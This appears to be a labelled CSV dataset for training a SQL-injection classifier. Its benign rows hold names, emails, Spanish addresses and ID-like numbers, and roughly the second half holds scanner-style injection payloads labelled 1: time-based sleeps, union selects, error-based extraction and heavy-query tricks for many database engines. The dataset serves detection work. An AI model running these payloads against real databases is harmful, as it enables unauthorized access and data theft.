,payload,label
26333,lovas@djbroadcast.bn,0
26334,"nuestra seora de la paz, 80 8f",0
26335,castejn de henares,0
26336,37748,0
26337,snedeker,0
26338,74ain7l,0
26339,brana@housemovie.id,0
26340,80937614q,0
26341,"banquilla, 171,",0
26342,sant vicen de castellet,0
26343,46179,0
26344,7500539436342438,0
26345,morgan,0
26346,foto3rfico,0
26347,7960,0
26348,siu-kwok,0
26349,gregescos,0
26350,hilda,0
26351,gonzaga ripalda,0
26352,shue-sampson@artroscopiagc.mn,0
26353,31827013g,0
26354,"nuestra seora de las angustias s/n,",0
26355,frigiliana,0
26356,24232,0
26357,ciochon,0
26358,sonoramente,0
26359,hecilia,0
26360,ann-margaret@indorec.pro,0
26361,26707809w,0
26362,"pasaje santo angel, 190,",0
26363,aldea del fresno,0
26364,16522,0
26365,bili,0
26366,pospalatal,0
26367,766,0
26368,koolwine,0
26369,seni+l,0
26370,basilisa,0
26371,pimienta rosas,0
26372,bjerg@hangartalleres.er,0
26373,78581094f,0
26374,"calle profeta, 96, 2?c",0
26375,pineda trasmonte,0
26376,29127,0
26377,8866944660576355,0
26378,pintarrajar,0
26379,gontrn,0
26380,tanquia jepus,0
26381,c/ costa i llobera 83,0
26382,3820743619643877,0
26383,kin-yee,0
26384,99r5na,0
26385,964,0
26386,casper,0
26387,ajorca,0
26388,pridiliano,0
26389,peri portaneri,0
26390,16727733v,0
26391,"paraje antonio de nebrija 39,",0
26392,06700,0
26393,margheri,0
26394,6m2rtam267t3,0
26395,delfa,0
26396,baziga-turtuno@ofertasrusas.dz,0
26397,"c/ hermenegilda portillo, 70",0
26398,godall,0
26399,31174,0
26400,8859240955120408,0
26401,tesch,0
26402,macilento,0
26403,5432,0
26404,ensminge,0
26405,s3borrea,0
26406,altaira,0
26407,tagle isurieta,0
26408,"plaza movimiento ciudadano, 176",0
26409,bollullos de la mitacin,0
26410,5738656777316429,0
26411,zalzale1,0
26412,vieta,0
26413,neil,0
26414,jandette tarrida,0
26415,castiglioni@hiperbilbao.nl,0
26416,calle rioguadalimar 183 1?e,0
26417,"torms, els",0
26418,40542,0
26419,4542202458392809,0
26420,scotty,0
26421,1165,0
26422,wilie,0
26423,v9n939z6,0
26424,subirs figaredo,0
26425,urchins@waikilu.mg,0
26426,93698052p,0
26427,"gredos, 114 12?g",0
26428,castroverde,0
26429,7277765230207053,0
26430,hlinka,0
26431,soez,0
26432,cristaldo marchan,0
26433,dubarry@soyrojo.tr,0
26434,21392437e,0
26435,bloc sant simo 93,0
26436,miravete de la sierra,0
26437,2569848242222580,0
26438,pakulski,0
26439,5ecom058a?8a,0
26440,6138,0
26441,brittni,0
26442,tr11quil67321e,0
26443,doreteo,0
26444,dennett,0
26445,miles_detmers@sotelink.vu,0
26446,30573468m,0
26447,uribitarte 72 13?g,0
26448,pravia,0
26449,abdollah,0
26450,mo19bun0a,0
26451,buchel-alymer@gemas.org.bu,0
26452,66883027q,0
26453,"doctor ramon sanchez-parra, 17 11?d",0
26454,miera,0
26455,6360914919102158,0
26456,janna,0
26457,eusquero,0
26458,3929,0
26459,goddette,0
26460,ci2586ta,0
26461,raimund,0
26462,forcades chocano,0
26463,drohocka@baybay.mq,0
26464,67718883y,0
26465,"hornillos s/n,",0
26466,valle de mena,0
26467,4087914907992137,0
26468,anand,0
26469,potroso,0
26470,eduviges,0
26471,estaol bellet,0
26472,verdier@zaya.name,0
26473,62258107m,0
26474,"c/ san pablo 130, 8h",0
26475,50140,0
26476,2780139956948714,0
26477,beaule,0
26478,envelar,0
26479,5970,0
26480,medioni5,0
26481,esdrs,0
26482,violy belcastro,0
26483,celeste_bryon@skullride.ki,0
26484,98970543w,0
26485,"1""))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (((""ymhg""=""ymhg",1
26486,"1"") as jidc where 6093=6093 and 9198=9198--",1
26487,1')) as tlsl where 8467=8467;begin user_lock.sleep(5); end--,1
26488,"1"") as ivkw where 4218=4218 union all select null--",1
26489,"1%'))) and elt(3114=3114,sleep(5))#",1
26490,"-7843' where 5986=5986 or make_set(9354=9354,7185)--",1
26491,1%'));begin user_lock.sleep(5); end--,1
26492,"1 and make_set(6911=1867,1867)",1
26493,"1) as ktfu where 2637=2637;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
26494,"1"") and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""pqsp""=""pqsp",1
26495,"1"" and 6969=(select 6969 from pg_sleep(5))",1
26496,1%'))) or (select * from (select(sleep(5)))sddo)#,1
26497,"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""jbty"" like ""jbty",1
26498,1)) as qlkf where 6635=6635;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
26499,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1
26500,"1')) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
26501,"1"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""zcfa""=""zcfa",1
26502,"-6096') where 1316=1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",1
26503,1' waitfor delay '0:0:5',1
26504,"1' where 6135=6135;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
26505,"1"") as drrx where 8633=8633 union all select null,null,null--",1
26506,"1'||(select 'lstx' from dual where 2972=2972 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'",1
26507,"1%""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""%""=""",1
26508,"1""))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
26509,"1));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((4142=4142",1
26510,"1"")) as szxa where 1501=1501 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
26511,"1%"")) or sleep(5)#",1
26512,"1') where 6081=6081 union all select null,null,null,null,null,null,null,null,null--",1
26513,-9840')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('dzlp'='dzlp,1
26514,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1
26515,"1')) union all select null,null,null,null,null,null,null--",1
26516,"-9821) as qqrm where 7152=7152 union all select 7152,7152,7152,7152--",1
26517,"1'+(select vvet where 5221=5221 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'",1
26518,"-9281) where 8363=8363 or make_set(8220=5127,5127)--",1
26519,1');(select * from (select(sleep(5)))srmq),1
26520,"1)) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((6659=6659",1
26521,"1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('teng' like 'teng",1
26522,"-5190%"" or 8298=9306 and ""%""=""",1
26523,1 and (5369=8325)*8325# psze,1
26524,"1 where 2146=2146 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
26525,"1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'cxor'='cxor",1
26526,"-4222') union all select 9267,9267,9267,9267,9267,9267--",1
26527,1'))) or 6793=(select 6793 from pg_sleep(5)) and ((('mzqi'='mzqi,1
26528,1) and (7557=1711)*1711 and (5157=5157,1
26529,"1))) union all select null,null,null,null,null#",1
26530,"-4513""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""gytb""=""gytb",1
26531,"-2766%')) union all select 4458,4458,4458,4458,4458--",1
26532,1' in boolean mode) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))#,1
26533,"1%')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('%'='",1
26534,-4952'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('abso'='abso,1
26535,"-7272"") union all select 9163,9163,9163,9163,9163,9163,9163--",1
26536,1' in boolean mode) rlike (select * from (select(sleep(5)))sgvo)#,1
26537,"1"" union all select null,null,null,null--",1
26538,"1') union all select null,null,null,null,null--",1
26539,1') where 2511=2511 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1
26540,"1' union all select null,null,null,null,null,null,null,null,null--",1
26541,"1') where 2090=2090;select count(*) from generate_series(1,5000000)--",1
26542,"1%'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'='",1
26543,"1'+(select 'zirh' where 9054=9054 and 3824=benchmark(5000000,md5(0x76555642)))+'",1
26544,1') and (3020=3020)*6703,1
26545,1 or 6793=(select 6793 from pg_sleep(5))-- fyaq,1
26546,"1'||(select 'osty' from dual where 6433=6433 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",1
26547,-8357')) as henk where 8198=8198 or 2558=9103#,1
26548,"1')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('vcvj'='vcvj",1
26549,"1'||(select 'wcad' from dual where 4262=4262 and elt(3114=3114,sleep(5))#",1
26550,"1"") where 5698=5698 and 8635=(select count(*) from generate_series(1,5000000))--",1
26551,"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'tuzl'='tuzl",1
26552,1') where 9817=9817;begin user_lock.sleep(5); end--,1
26553,"1""));select * from generate_series(6200,6200,case when (6200=5449) then 1 else 0 end) limit 1--",1
26554,"1"") as xsgx where 5239=5239 union all select null,null--",1
26555,"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'dphz'='dphz",1
26556,1 and 7533=7533-- spzi,1
26557,"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",1
26558,"1%"" or 6793=(select 6793 from pg_sleep(5)) and ""%""=""",1
26559,-9657') as ziiq where 7725=7725 or 3038=3038,1
26560,"1'+(select pepf where 5071=5071 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
26561,1')) order by 1#,1
26562,1)) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((5139=5139,1
26563,-9522) as lraw where 9472=9472 or (4087=8213)*8213--,1
26564,1%');begin dbms_lock.sleep(5); end--,1
26565,-7659') as bowy where 4835=4835 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
26566,"-8940"") or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""vnuo"" like ""vnuo",1
26567,1;waitfor delay '0:0:5'--,1
26568,"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",1
26569,1' where 3701=3701 and 2006=2006,1
26570,1') union all select null#,1
26571,"1)) as vycb where 3524=3524 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
26572,"1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('ykxz'='ykxz",1
26573,"1%"")) union all select null,null,null,null,null,null,null,null,null,null--",1
26574,"1'||(select 'jscc' from dual where 3266=3266 and elt(4249=4249,7259))||'",1
26575,"1""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""lmjg"" like ""lmjg",1
26576,"1""))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
26577,"1' or elt(6272=6272,sleep(5)) and 'wdoi'='wdoi",1
26578,"1"")) as qgwq where 6122=6122;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
26579,1);begin dbms_lock.sleep(5); end--,1
26580,1%'))) and 9198=9198--,1
26581,"-2247') union all select 1202,1202,1202,1202,1202#",1
26582,"1""))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((""wvlb"" like ""wvlb",1
26583,"1%"" waitfor delay '0:0:5'--",1
26584,1%');select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1
26585,"1%') or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('%'='",1
26586,"1""))) and (3020=3020)*6703 and (((""krxy""=""krxy",1
26587,"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",1
26588,"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",1
26589,"1%""));select case when 7717=7717 then 1 else null end--",1
26590,1) as oknr where 3228=3228;(select * from (select(sleep(5)))srmq)--,1
26591,"1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",1
26592,"1""))) union all select null,null,null,null,null,null--",1
26593,"1"" where 9792=9792 rlike (select * from (select(sleep(5)))vwyq)#",1
26594,1') as twny where 9580=9580;begin dbms_lock.sleep(5); end--,1
26595,-7720)) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((8254=8254,1
26596,"1%"")) waitfor delay '0:0:5'--",1
26597,"1"" where 1140=1140 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
26598,"1' in boolean mode) union all select null,null,null,null,null,null,null,null#",1
26599,"1'+(select biqo where 6046=6046;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
26600,"1%')) and make_set(8403=8403,8899) and (('%'='",1
26601,"-3632' or make_set(9354=9354,7185) and 'lgpy' like 'lgpy",1
26602,"1)) as hgtl where 3864=3864 and elt(3114=3114,sleep(5))#",1
26603,"1"") as pkkx where 6716=6716 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",1
26604,-7435') where 6242=6242 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,1
26605,"1%"") union all select null,null,null--",1
26606,"1"")) as tngu where 3644=3644 union all select null--",1
26607,"1%"") and 7533=7533 and (""%""=""",1
26608,"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""pmpk"" like ""pmpk",1
26609,1' in boolean mode) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))#,1
26610,"1"") or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1
26611,"-1303' union all select 4840,4840#",1
26612,-9644)) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((5616=5616,1
26613,"1' where 8950=8950 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
26614,"1"" union all select null,null,null,null,null--",1
26615,"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ican' like 'ican",1
26616,"1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('bacm'='bacm",1
26617,"1') and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('adjc'='adjc",1
26618,1 where 4985=4985 order by 1#,1
26619,"-8790') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('nsze' like 'nsze",1
26620,"1"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""mmgx"" like ""mmgx",1
26621,"1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('nlky' like 'nlky",1
26622,"-7107""))) order by 1#",1
26623,"1"") as ktnq where 9005=9005;select benchmark(5000000,md5(0x714e4153))#",1
26624,"1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('jueq'='jueq",1
26625,"1'))) union all select null,null,null,null--",1
26626,"1'+(select 'sppw' where 1677=1677 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))+'",1
26627,-8652') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),1
26628,1;select pg_sleep(5)-- ojzt,1
26629,"1"" where 4633=4633 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",1
26630,"1%"" union all select null,null,null,null,null,null#",1
26631,"1))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((1748=1748",1
26632,"-2027%"") union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1
26633,"1"")) or 4240=(select 4240 from pg_sleep(5))--",1
26634,"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('ozef'='ozef",1
26635,"1"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""rrbl""=""rrbl",1
26636,-6014')) or (9860=4848)*4848 and (('qtge'='qtge,1
26637,"(select like('abcdefg',upper(hex(randomblob(500000000/2)))))",1
26638,"-3633') where 3513=3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",1
26639,1;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,1
26640,1') as xqbq where 1619=1619 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,1
26641,1' where 8635=8635 order by 1--,1
26642,-6036))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((6723=6723,1
26643,"1 union all select null,null,null,null,null,null,null,null,null,null#",1
26644,1);select sleep(5) and (4863=4863,1
26645,-8860) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),1
26646,"1"" and (select * from (select(sleep(5)))gcrr)#",1
26647,"-1048%"" or 3038=3038",1
26648,"-2359' union all select 2687,2687,2687#",1
26649,1) as wshv where 5684=5684;(select * from (select(sleep(5)))acdk)#,1
26650,-4289' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'agnc' like 'agnc,1
26651,1') as mqxb where 6496=6496 and 7533=7533--,1
26652,"-3219"") order by 1--",1
26653,"1%');call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
26654,-6039%')) or 6872=6872 and (('%'=',1
26655,"1') where 4092=4092 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
26656,"1"")) as riui where 2605=2605;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1
26657,1'+(select eluw where 6210=6210;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
26658,"1%' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and '%'='",1
26659,"1"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""kzcd""=""kzcd",1
26660,"1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",1
26661,"-9774'))) union all select 6954,6954,6954#",1
26662,"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'tfso'='tfso",1
26663,1'||(select 'ogyu' from dual where 6691=6691;select (case when (8820=4648) then 8820 else 8820*(select 8820 from information_schema.character_sets) end)#,1
26664,1')) as bswc where 1635=1635 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
26665,"1) and 8635=(select count(*) from generate_series(1,5000000))--",1
26666,1;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
26667,"1';select benchmark(5000000,md5(0x714e4153))#",1
26668,-2817) where 1212=1212 or 3266=1102,1
26669,"-9574') as rxym where 4719=4719 union all select 4719,4719,4719,4719,4719,4719,4719--",1
26670,"1')) as ylyq where 2953=2953 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
26671,-8453))) or 3038=3038,1
26672,"1,(select (case when (9443=9443) then sleep(5) else 9443*(select 9443 from information_schema.character_sets) end))",1
26673,1') where 6222=6222 or (select * from (select(sleep(5)))ydpu)--,1
26674,"1'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('lyem' like 'lyem",1
26675,"-9160') union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1
26676,"1"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""stcv""=""stcv",1
26677,"1"") where 5491=5491;begin user_lock.sleep(5); end--",1
26678,"-7412"") as qngt where 2041=2041 union all select 2041--",1
26679,"1%"" and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
26680,"1"")) as vbpl where 3885=3885 and 6969=(select 6969 from pg_sleep(5))--",1
26681,"1 where 6100=6100 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
26682,"1""));if(9690=6491) select 9690 else drop function nyln--",1
26683,"1,iif(6333=1227,1,1/0)",1
26684,"1%') or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
26685,"1"") where 4951=4951;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
26686,"1%"")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""%""=""",1
26687,"1%')));select benchmark(5000000,md5(0x4c4d6142)) and ((('%'='",1
26688,"1) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
26689,"-3194""))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""erua""=""erua",1
26690,"1"") and sleep(5) and (""ytof""=""ytof",1
26691,1' where 6913=6913 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,1
26692,"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""squx"" like ""squx",1
26693,"1 where 3737=3737 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
26694,"1"" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""kins""=""kins",1
26695,"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1
26696,"1'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('gwew' like 'gwew",1
26697,1)) order by 1#,1
26698,"-9122) as sdlg where 1546=1546 union all select 1546,1546,1546,1546,1546,1546,1546--",1
26699,"1"" where 5236=5236 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1
